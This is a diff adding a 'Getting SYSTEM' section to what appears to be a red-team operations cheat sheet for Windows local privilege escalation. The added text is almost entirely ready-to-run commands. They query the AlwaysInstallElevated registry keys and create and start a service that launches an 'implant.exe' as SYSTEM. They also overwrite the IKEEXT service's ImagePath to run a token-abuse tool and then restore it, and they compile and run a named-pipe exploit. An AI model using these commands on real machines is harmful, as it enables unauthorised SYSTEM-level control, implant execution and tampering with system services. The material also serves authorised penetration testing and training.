@@ -170,3 +170,43 @@ https://github.com/hfiref0x/UACME
 ```
 
 ### Getting SYSTEM
+
+- Search for AlwaysInstallElevated MSI setting
+
+```
+C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+
+- Create a new service for SYSTEM
+
+```
+run from elevated admin cmd/console:
+C:\> sc create lol binPath= "c:\RTO\LPE\implant\implant.exe"
+C:\> sc start lol
+C:\> sc stop lol
+C:\> sc delete lol
+```
+
+- Abuse tokens
+
+```
+C:\> reg query HKLM\SYSTEM\CurrentControlSet\services\IKEEXT
+C:\> reg add HKLM\SYSTEM\CurrentControlSet\services\IKEEXT /v ImagePath /t REG_EXPAND_SZ /d c:\RTO\LPE\2SYSTEM\TokenDance\tokendance.exe /f
+
+C:\> sc stop ikeext
+C:\> sc start ikeext
+
+C:\> reg add HKLM\SYSTEM\CurrentControlSet\services\IKEEXT /v ImagePath /t REG_EXPAND_SZ /d "%systemroot%\system32\svchost.exe -k netsvcs -p" /f
+```
+
+- Exploit named pipes
+
+```
+C:\> cd \RTO\LPE\2SYSTEM\Piper
+C:\> compile.bat
+
+run from elevated admin cmd/console:
+C:\> cd \RTO\LPE\2SYSTEM\Piper
+C:\> piper.exe
+```
